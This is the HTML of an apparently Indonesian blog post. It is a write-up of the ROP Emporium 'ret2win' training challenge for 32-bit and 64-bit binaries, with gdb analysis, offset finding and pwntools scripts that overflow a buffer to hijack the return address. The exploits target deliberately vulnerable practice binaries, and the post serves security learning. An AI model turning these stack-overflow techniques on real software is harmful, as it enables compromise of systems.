<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Writeup ROP Emporium Ret2win [pwn] | ahm4ddm</title><meta name=keywords content="writeups,rop,stack-overflow,64bit,32bit"><meta name=description content="Daftar Isi Download     ret2win32 klik   ret2win64 klik    ret2win32 kita cek terlebih dahulu filenya.
Didapatkan file ELF, dan dynamically linked
$file ret2win32 ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.
kita bisa bypass NX dengan metode return oriented programming (rop)"><meta name=author content><link rel=canonical href=https://ahm4ddm.github.io/writeups/writeup-rope-ret2win/><link href=/assets/css/stylesheet.min.23ca66c33946ea0cee2c04d1168bf7a5e397fb03f9bcd6cc11a233ae8e51b097.css integrity="sha256-I8pmwzlG6gzuLATRFov3peOX+wP5vNbMEaIzro5RsJc=" rel="preload stylesheet" as=style><link rel=icon href=https://ahm4ddm.github.io/fav.ico><link rel=icon type=image/png sizes=16x16 href=https://ahm4ddm.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ahm4ddm.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://ahm4ddm.github.io/apple-touch-icon.png><link rel=mask-icon href=https://ahm4ddm.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.80.0"><meta property="og:title" content="Writeup ROP Emporium Ret2win [pwn]"><meta property="og:description" content="Daftar Isi Download     ret2win32 klik   ret2win64 klik    ret2win32 kita cek terlebih dahulu filenya.
Didapatkan file ELF, dan dynamically linked
$file ret2win32 ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.
kita bisa bypass NX dengan metode return oriented programming (rop)"><meta property="og:type" content="article"><meta property="og:url" content="https://ahm4ddm.github.io/writeups/writeup-rope-ret2win/"><meta property="article:published_time" content="2021-02-10T22:29:10+07:00"><meta property="article:modified_time" content="2021-02-10T22:29:10+07:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Writeup ROP Emporium Ret2win [pwn]"><meta name=twitter:description content="Daftar Isi Download     ret2win32 klik   ret2win64 klik    ret2win32 kita cek terlebih dahulu filenya.
Didapatkan file ELF, dan dynamically linked
$file ret2win32 ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.
kita bisa bypass NX dengan metode return oriented programming (rop)"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Writeup ROP Emporium Ret2win [pwn]","name":"Writeup ROP Emporium Ret2win [pwn]","description":"Daftar Isi Download     ret2win32 klik   ret2win64 klik    ret2win32 kita cek terlebih dahulu filenya.\nDidapatkan file ELF, dan dynamically linked\n$file ret2win32 ret2win32: ELF â€¦","keywords":["writeups","rop","stack-overflow","64bit","32bit"],"articleBody":"   Daftar Isi Download     ret2win32 klik   ret2win64 klik    ret2win32 kita cek terlebih dahulu filenya.\nDidapatkan file ELF, dan dynamically linked\n$file ret2win32 ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop)\n$checksec ret2win32 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) kita cek dengan gdb, saya mencoba dengan menampilkan semua fungsi yang ada pada binary\ngdb-peda$ info functions All defined functions: Non-debugging symbols: ... ... ... 0x08048510 __do_global_dtors_aux 0x08048540 frame_dummy 0x08048546 main 0x080485ad pwnme 0x0804862c ret2win 0x08048660 __libc_csu_init 0x080486c0 __libc_csu_fini 0x080486c4 _fini kita coba disassembly fungsi main.\npada fungsi main binary memanggil fungsi yaitu pwnme\ngdb-peda$ pdisas main Dump of assembler code for function main: ... ... ... 0x08048583 :\tcall 0x80483d0  0x08048588 :\tadd esp,0x10 0x0804858b :\tcall 0x80485ad  ... ... ... End of assembler dump. kita disassembly fungsi pwnme ternyata ada kerentanan fungsi read dimana tidak ada Null Byte pada saat input berakhir.\ngdb-peda$ pdisas pwnme Dump of assembler code for function pwnme: ... ... ... 0x0804860e :\tpush eax 0x0804860f :\tpush 0x0 0x08048611 :\tcall 0x80483b0  0x08048616 :\tadd esp,0x10 0x08048619 :\tsub esp,0xc ... ... ... Tidak ada pemanggilan fungsi ret2win pada binary.\nkita cek disassembly fungsi ret2win ternyata ada pemanggilan system\ngdb-peda$ pdisas ret2win Dump of assembler code for function ret2win: ... ... ... 0x08048645 :\tpush 0x8048813 0x0804864a :\tcall 0x80483e0  ... ... ... saya beranggapan bahwa itu memanggil system(cat flag.txt) dan ternyata benar\n0x8048813:\t\"/bin/cat flag.txt\" Kita buat exploit code.\nPertama harus tau offset ke EIP.\ndidapatkan 44.\nRegisters contain pattern buffer: ECX+52 found at offset: 69 EDX+52 found at offset: 69 EBP+0 found at offset: 40 EIP+0 found at offset: 44 Registers point to pattern buffer: [ESP] -- offset 48 - size ~8 Pattern buffer found at: 0xffffd0c0 : offset 0 - size 56 ($sp + -0x30 [-12 dwords]) References to pattern buffer found at: 0xffffd0b4 : 0xffffd0c0 ($sp + -0x3c [-15 dwords]) kita buat kode exploit\nfrom pwn import * p = ELF('./ret2win32') r = process('./ret2win32') ret2win = p.symbols['ret2win'] junk = b'X'*44 junk += p32(ret2win) log.info('ret2win 0x%x' %ret2win) r.sendline(junk) r.interactive() $python3 solver.py ... ... ...  Thank you! Well done! Here's your flag: ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $ ret2win64 kita cek terlebih dahulu filenya.\nDidapatkan file ELF, dan dynamically linked\n$file ret2win ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop)\n$checksec ret2win Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Setelah dilakukan pengecekan pada gdb sama seperti binary 32 bit\nKita cari offset. didapatkan 40\nMungkin disini timbul pertanyaan, kenapa RIP tidak ter-overwrite? karena aplikasi yang berjalan pada arsitektur 64-bit hanya me-load canonical address ke dalam register RIP\nContoh: Ketika overflow sebuah buffer dengan pattern yang kita buat dan ingin melihat RIP tertimpa dengan alamat pattern seharusnya tidak bisa karena itu bukan canonical address. lebih lanjut kunjungi ini\nRegisters contain pattern buffer: RBP+0 found at offset: 32 Registers point to pattern buffer: [RSP] -- offset 40 - size ~35 Pattern buffer found at: 0x00007fffffffdf30 : offset 0 - size 56 ($sp + -0x28 [-10 dwords]) References to pattern buffer found at: 0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords]) 0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords]) 0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords]) Kita buat kode exploit\nfrom pwn import * p = ELF('./ret2win') r = process('./ret2win') ret2win = p.symbols['ret2win'] junk = b'X'*40 junk += p64(ret2win) log.info('ret2win 0x%x' %ret2win) r.sendline(junk) r.interactive() $python3 sol.py ... ... ...  Thank you! Well done! Here's your flag: ROPE{a_placeholder_32byte_flag!} [*] Got EOF while reading in interactive $ ","wordCount":"672","inLanguage":"en","datePublished":"2021-02-10T22:29:10+07:00","dateModified":"2021-02-10T22:29:10+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ahm4ddm.github.io/writeups/writeup-rope-ret2win/"},"publisher":{"@type":"Organization","name":"ahm4ddm","logo":{"@type":"ImageObject","url":"https://ahm4ddm.github.io/fav.ico"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><noscript><style type=text/css>.theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://ahm4ddm.github.io accesskey=h title="ahm4ddm (Alt + H)"><img src=/home.png alt=logo aria-label=logo height=30px>ahm4ddm</a>
<span class=logo-switches><a id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://ahm4ddm.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://ahm4ddm.github.io/writeups/ title=writeups><span>writeups</span></a></li><li><a href=https://ahm4ddm.github.io/colleges/ title=colleges><span>colleges</span></a></li><li><a href=https://ahm4ddm.github.io/projects/ title=projects><span>projects</span></a></li><li><a href=https://ahm4ddm.github.io/archives/ title=archives><span>archives</span></a></li><li><a href=https://ahm4ddm.github.io/about/ title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Writeup ROP Emporium Ret2win [pwn]</h1><div class=post-meta>February 10, 2021&nbsp;Â·&nbsp;4 min</div></header><div class=post-content><table><thead><tr><th>Daftar Isi</th><th>Download</th></tr></thead><tbody><tr><td><a href=#ret2win32>ret2win32</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/32/ret2win32/ret2win32>klik</a></td></tr><tr><td><a href=#ret2win64>ret2win64</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/64/ret2win/ret2win>klik</a></td></tr></tbody></table><h3 id=ret2win32>ret2win32<a hidden class=anchor aria-hidden=true href=#ret2win32>#</a></h3><p>kita cek terlebih dahulu filenya.<br>Didapatkan file ELF, dan dynamically linked</p><pre><code>$file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
</code></pre><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop)</p><pre><code>$checksec ret2win32
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>kita cek dengan gdb, saya mencoba dengan menampilkan semua fungsi yang ada pada binary</p><pre><code>gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
...
...
...
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
</code></pre><p>kita coba disassembly fungsi <em><strong>main</strong></em>.<br>pada fungsi main binary memanggil fungsi yaitu <em><strong>pwnme</strong></em></p><pre><code>gdb-peda$ pdisas main
Dump of assembler code for function main:
   ...
   ...
   ...
   0x08048583 &lt;+61&gt;:	call   0x80483d0 &lt;puts@plt&gt;
   0x08048588 &lt;+66&gt;:	add    esp,0x10
   0x0804858b &lt;+69&gt;:	call   0x80485ad &lt;pwnme&gt;
   ...
   ...
   ...
End of assembler dump.

</code></pre><p>kita disassembly fungsi <em><strong>pwnme</strong></em> ternyata ada kerentanan fungsi <em><strong>read</strong></em> dimana tidak ada Null Byte pada saat input berakhir.</p><pre><code>gdb-peda$ pdisas pwnme
Dump of assembler code for function pwnme:
...
...
...
   0x0804860e &lt;+97&gt;:	push   eax
   0x0804860f &lt;+98&gt;:	push   0x0
   0x08048611 &lt;+100&gt;:	call   0x80483b0 &lt;read@plt&gt;
   0x08048616 &lt;+105&gt;:	add    esp,0x10
   0x08048619 &lt;+108&gt;:	sub    esp,0xc
...
...
...
</code></pre><p>Tidak ada pemanggilan fungsi <em><strong>ret2win</strong></em> pada binary.<br>kita cek disassembly fungsi <em><strong>ret2win</strong></em>
ternyata ada pemanggilan <em><strong>system</strong></em></p><pre><code>gdb-peda$ pdisas ret2win
Dump of assembler code for function ret2win:
...
...
...
   0x08048645 &lt;+25&gt;:	push   0x8048813
   0x0804864a &lt;+30&gt;:	call   0x80483e0 &lt;system@plt&gt;
...
...
...
</code></pre><p>saya beranggapan bahwa itu memanggil <em><strong>system(cat flag.txt)</strong></em> dan ternyata benar</p><pre><code>0x8048813:	&quot;/bin/cat flag.txt&quot;
</code></pre><p>Kita buat exploit code.<br>Pertama harus tau offset ke EIP.<br>didapatkan 44.</p><pre><code>Registers contain pattern buffer:
ECX+52 found at offset: 69
EDX+52 found at offset: 69
EBP+0 found at offset: 40
EIP+0 found at offset: 44
Registers point to pattern buffer:
[ESP] --&gt; offset 48 - size ~8
Pattern buffer found at:
0xffffd0c0 : offset    0 - size   56 ($sp + -0x30 [-12 dwords])
References to pattern buffer found at:
0xffffd0b4 : 0xffffd0c0 ($sp + -0x3c [-15 dwords])
</code></pre><p>kita buat kode exploit</p><pre><code>from pwn import *
p = ELF('./ret2win32')
r = process('./ret2win32')

ret2win = p.symbols['ret2win']
junk = b'X'*44
junk += p32(ret2win)
log.info('ret2win 0x%x' %ret2win)
r.sendline(junk)
r.interactive()
</code></pre><pre><code>$python3 solver.py
...
...
...
&gt; Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
</code></pre><h3 id=ret2win64>ret2win64<a hidden class=anchor aria-hidden=true href=#ret2win64>#</a></h3><p>kita cek terlebih dahulu filenya.<br>Didapatkan file ELF, dan dynamically linked</p><pre><code>$file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
</code></pre><p>lalu kita cek proteksi pada file. didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop)</p><pre><code>$checksec ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><p>Setelah dilakukan pengecekan pada gdb sama seperti binary 32 bit<br>Kita cari offset. didapatkan 40<br>Mungkin disini timbul pertanyaan, kenapa RIP tidak ter-overwrite?
karena aplikasi yang berjalan pada arsitektur 64-bit hanya me-load canonical address ke dalam register <em><strong>RIP</strong></em><br>Contoh: Ketika overflow sebuah buffer dengan pattern yang kita buat dan ingin melihat <em><strong>RIP</strong></em> tertimpa dengan alamat pattern seharusnya tidak bisa karena itu bukan canonical address. lebih lanjut kunjungi <a href=https://en.wikipedia.org/wiki/X86-64#Virtual_address_space_details>ini</a></p><pre><code>Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RSP] --&gt; offset 40 - size ~35
Pattern buffer found at:
0x00007fffffffdf30 : offset    0 - size   56 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007fffffffb340 : 0x00007fffffffdf30 ($sp + -0x2c18 [-2822 dwords])
0x00007fffffffdb40 : 0x00007fffffffdf30 ($sp + -0x418 [-262 dwords])
0x00007fffffffdb58 : 0x00007fffffffdf30 ($sp + -0x400 [-256 dwords])
</code></pre><p>Kita buat kode exploit</p><pre><code>from pwn import *

p = ELF('./ret2win')
r = process('./ret2win')

ret2win = p.symbols['ret2win']
junk = b'X'*40
junk += p64(ret2win)
log.info('ret2win 0x%x' %ret2win)
r.sendline(junk)
r.interactive()
</code></pre><pre><code>$python3 sol.py
...
...
...
&gt; Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$  
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://ahm4ddm.github.io/tags/writeups/>writeups</a></li><li><a href=https://ahm4ddm.github.io/tags/rop/>rop</a></li><li><a href=https://ahm4ddm.github.io/tags/stack-overflow/>stack-overflow</a></li><li><a href=https://ahm4ddm.github.io/tags/64bit/>64bit</a></li><li><a href=https://ahm4ddm.github.io/tags/32bit/>32bit</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://ahm4ddm.github.io>ahm4ddm</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
<span>&#183;</span>
<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script defer src=/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w=" onload=hljs.initHighlightingOnLoad();></script><script>window.onload=function(){if(localStorage.getItem("menu-scroll-position")){document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position");}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft);}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script></body></html>